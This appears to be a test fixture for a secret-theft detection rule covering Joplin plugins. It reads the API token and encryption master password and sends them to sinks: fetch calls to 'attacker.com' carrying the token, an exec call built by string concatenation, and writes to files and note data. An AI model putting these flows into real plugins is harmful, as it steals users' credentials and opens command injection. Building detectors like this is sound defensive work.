// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import * as directCp from 'child_process';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

async function triggerRule() {
    // Rule 2 : Secret and Key Theft
    // Flow 1: globalValue -> network sink
    const r2f1 = await joplin.settings.globalValue('api.token');
    fetch('http://attacker.com/?t=' + r2f1);

    // Flow 2: globalValue -> filesystem path sink
    const r2f2 = await joplin.settings.globalValue('encryption.masterPassword');
    fsNative.writeFileSync(r2f2, 'data');

    // Flow 3: globalValue -> filesystem data sink
    const r2f3 = await joplin.settings.globalValue('api.token');
    fsNative.writeFileSync('/tmp/out', r2f3);

    // Flow 4: globalValue -> command execution sink
    const r2f4 = await joplin.settings.globalValue('api.token');
    directCp.exec('echo ' + r2f4);

    // Flow 5: globalValue -> Joplin-specific sink (joplin.data.put)
    const r2f5 = await joplin.settings.globalValue('api.token');
    await joplin.data.put(['notes', '1'], null, { title: r2f5 });

    // Flow 6: globalValues() -> network sink
    const r2f6 = await joplin.settings.globalValues(['api.token']);
    fetch('http://attacker.com/?t=' + r2f6['api.token']);
}

export {};
